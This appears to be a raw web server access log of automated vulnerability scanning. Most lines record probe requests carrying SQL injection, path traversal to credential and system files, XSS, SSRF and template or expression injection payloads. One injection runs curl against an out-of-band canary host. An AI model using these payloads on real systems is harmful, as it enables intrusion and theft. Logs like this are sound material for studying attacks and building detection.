2026-02-20 15:59:25,364 [INFO] 目标地址  : https://dashscope.aliyuncs.com/compatible-mode/v1
INFO:     3.211.106.148:41932 - "GET /wp-admin/admin-ajax.php?s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index HTTP/1.1" 200 OK
INFO:     3.211.106.148:41908 - "GET /api/storage/logs/laravel.log HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /xyz123?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "POST /j/rest/endpoint/hostactivity/1/a/?pz=1 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /log/firewall.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /nagios/cgi-bin/status.cgi HTTP/1.1" 200 OK
INFO:     3.211.106.148:41908 - "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /App_Data/ HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /xyz123?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "POST /upload.action HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /applicationapi.svc HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /cms/routes/configs/routes.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:41908 - "GET /wp-content/plugins/robotcpa/f.php?l=ZmlsZTovLy9ldGMvcGFzc3dk HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /actuator/threaddump HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /poc.txt HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/swagger.yml HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /xyz123?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /roundcube/logs/sendmail HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/storage/logs/laravel.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "POST /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /api/docs/swagger.json HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /index.php/component/jemessenger/box_details?task=download&dw_file=../../.././../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /_vti_bin/lists.asmx?WSDL HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /assets/elFinder/elfinder.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /..../..../..../..../..../..../..../..../..../windows/win.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /CMSPages/GetDocLink.ashx?link=https://example.com/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /_cat/indices?v HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "POST /sysmgmt/2015/bmc/session HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /v1/credentials HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /?u=ac29k HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "PUT /v1/kv/b9a945c7caa82e3903976c1da971aaab HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /proxy.stream?origin=https://ssrfcanary.com HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /collections/postman.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /proxy%3Ahttps%3A//ssrfcanary.com/%3Findex.0.css HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /.env.dev.local HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /aaaaa HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /login?next=/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /install.sql HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /test?ENV.to_a%0aend%0a%0a__END__%0a=123 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /_layouts/15/spinstallx.aspx HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /liquibase HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "POST /EemAdminService/EemAdmin HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /startup.sh HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /ws_utc/config.do HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /api/experimental/dags/example_trigger_target_dag/tasks/bash_task HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /license/Unlicensed.xhtml/an?javax.faces.ViewState=an&GARequestAction=activate HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/docs/swagger.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /svg/U9npA2v9B2efpStXij9Ii4dEpyaliYfAJR4B3G-rqGTpxRXqWO1BIo4pDp4zLQ72GCzKmKh19ZCttIgZfAIWs4fVlxYuA2qvCI-ng58lEJ-tkZWvCIVL5gYkrexBciiXDIy5P3u09QiYBm00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /swagger/swagger-ui HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /log/access.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /rails_route_internals_route_not_found_application_routing_error HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /webjars/swagger-ui/4.16.0-alpha.1/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /system/sling/loginstatus.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "POST /json/setup-restore.action HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /index.php?option=com_joomlapicasa2&controller=../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /rest/applinks/1.0/manifest HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /v3/settings/first-login HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "POST /CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/image?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /webjars/swagger-ui/3.32.3/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /php/telnet_form.php?hostname=%3C%2Ftitle%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Ctitle%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/experimental/dags/example_trigger_target_dag/tasks/bash_task HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /resin-doc/viewfile/?contextpath=/.&servletpath=&file=index.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /pls/apex_admin HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /WebInterface/login.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /%28S%28x%29%29/b/%28S%28x%29%29in/Microsoft.Owin.Host.SystemWeb.dll HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /metrics/v1/mbeans HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /onlinePreview?url=aHR0cHM6Ly93d3cuZ29vZ2xlLjxpbWcgc3JjPTEgb25lcnJvcj1hbGVydChkb2N1bWVudC5kb21haW4pPj1QUQ== HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/image?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /authorization.do HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /haproxy-status HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /openam/ccversion/Version HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /axis2/axis2-web/HappyAxis.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /openx/www/delivery/lg.php?dest=http://example.com HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/image?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /static/?/../../../../../../../../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /system/console%3Bx%3D%27.css/x%27 HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /logo/2246730b73c23a89f25ed66adc3059bd.txt HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /carbon/admin/login.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /bin/querybuilder.json.css HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/image?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /admin-app/.env HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /authenticationendpoint/org_name.jsp?idp=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /wp-json/acf/v3/options/a?id=active&field=plugins HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /vendor/pear/pear/scripts/peclcmd.php?x+config-help HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /api/traces?traceID=12312313 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /openapi HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /.bzr/branch-format HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /console/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /api/dns HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /actuator/env HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "POST /s2/upload.action HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "POST /wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "POST /aspera/faspex/package_relay/relay_access HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /proxy%3Ahttp%3A//example.com/index.0.js HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /gradle/libs.versions.toml HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /login?redirect=%2F HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /hmc/hybris HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/data/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "POST /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "POST /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "POST /api/pull HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /admin/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /api/swagger-ui.html HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/data/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /install.sh HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/traces?traceID=12312313 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /?m=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&n=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&o=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&p=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&q=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&t=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&u=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&v=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&w=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&x=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&y=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&z=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /composer.lock HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /index.php?option=com_bfsurvey&controller=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/data/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /wp-config.orig HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /%28S%28x%29%29/b/%28S%28x%29%29in/System.Web.Http.dll HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /system/console%3Bx%3D%27.ico/x%27 HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/dns HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /application/heapdump HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /contrib/acog/print_form.php?formname=../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /common/down/file?filekey=/../../../../../../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "POST /_inc/vendor/stripe/stripe-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/data/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28"Hello%20from"%20%2B%20"%20search%20text%3A"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /js/tinymce/jscripts/tiny_mce/plugins/elfinder/elfinder.html HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/refresh/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "POST /api/pull HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /.travis.sh HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /logs/downloadMainLog?fname=../../../../../../..//etc/passwd HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/refresh/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /index.php?option=com_powermail&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/swagger-ui.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /login?user=sth%22+onmouseover=%22alert()%22+id=%22xss%22+%22%ff HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /?a+--env=! HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /api/apidocs HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /exploit.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /%28S%28x%29%29/b/%28S%28x%29%29in/System.Web.Razor.dll HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/refresh/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /ReportServer/Pages/ReportViewer.aspx?aaa HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /jasperserver/runtime/C066EF1A/scripts/..%3B/WEB-INF/web.xml HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "POST /?Command=NOOP&InternalFile=../../../../../../../../../../../../../../Windows/win.ini&NewWebClient=1 HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/refresh/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /InsightPluginShowGeneralConfiguration.jspa%3B HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "POST /install/install.php?step=4 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /sap/admin/public/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /cart HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/redirect/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /webjars/swagger-ui/3.13.6/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /test.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /v2/api-docs HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/apidocs HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "POST /oam/server/opensso/sessionservice HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /?/../../../../../../../usr/share/xml/fontconfig/fonts.dtd HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /mgmt/grafana/avatar/%3Fd%3D1.bp.blogspot.com%252fme.jpg%25252f..%25252f..%25252fssrfcanary.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain) HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /index.php?option=com_archeryscores&controller=../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /db/schema.rb HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "POST /runtime/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /index.php/install/ HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/redirect/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /debug/pprof/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /?Display_FAQ=%3C/script%3E%3Csvg/onload=alert(document.cookie)%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /html/js/dojo/README-Building-dojo-for-dotCMS.txt HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /wp-config.txt HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /whoAmI HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /storage/sessions/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /%250m%250jX-Fake-Header-Sec%3A1 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /corporate/pma/setup/index.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /users/sign_in HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /configuration.php6 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /api/api.php/%3Cscript%3Ealert%28document.domain%29%3C/script%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /docs/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /artifactory/ui/api/v1/ui/repodata?deploy=true HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /?patron_only_image=../../../../../../../../../../windows/win.ini&patreon_action=serve_patron_only_image HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /share/api/notes/%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /TS/export/pagedefinition?ID=1 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /moto/routes/configs/routes.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /manage/threaddump HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /%2BCSCOT%2B/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/redirect/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /images/?/../../../../../../../../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /nonexistent?url=%27"><%2Fscript><script>alert(document.domain)<%2Fscript> HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab=logging HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /actions/debug/default/toolbar HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/redirect/?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././windows/win.ini&delete=0 HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /sendgrid.env HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /pages/setup.php?defaultlanguage=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /telescope/requests HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /webmin/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /api/v2/featureusage_history?adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%2039wcvowqvabsdgh7uumkzwldjgx.39wcvnwfry8fgc1lmjod7vwhguy.canary.assetnotessrf.com')%7d HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /RemoteApplicationMetadata.rem?wsdl HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /cgi-bin/../../../../../../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/turbopack/flight?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /wp-config.php.new~ HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "GET /index.php?option=com_imagebrowser&folder=../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /server-status HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /sm/login/loginpagecontentgrabber.do HTTP/1.1" 200 OK
INFO:     44.199.133.172:42796 - "POST /_next/turbopack/flight?c1=3 HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "POST /tc.CBS.Appl/tcspseudo HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=Windows/win.ini HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /docs HTTP/1.1" 200 OK
INFO:     3.211.106.148:49552 - "GET /account/?user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database:%22,md5(12412124),0x7c,%20%22Version:%22,version()),13--+- HTTP/1.1" 200 OK
INFO:     3.211.106.148:40600 - "GET /npm-debug.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:49558 - "GET /deployment-config.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:41932 - "GET /modules/fieldpopupnewsletter/ajax.php?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:40588 - "POST / HTTP/1.1" 200 OK
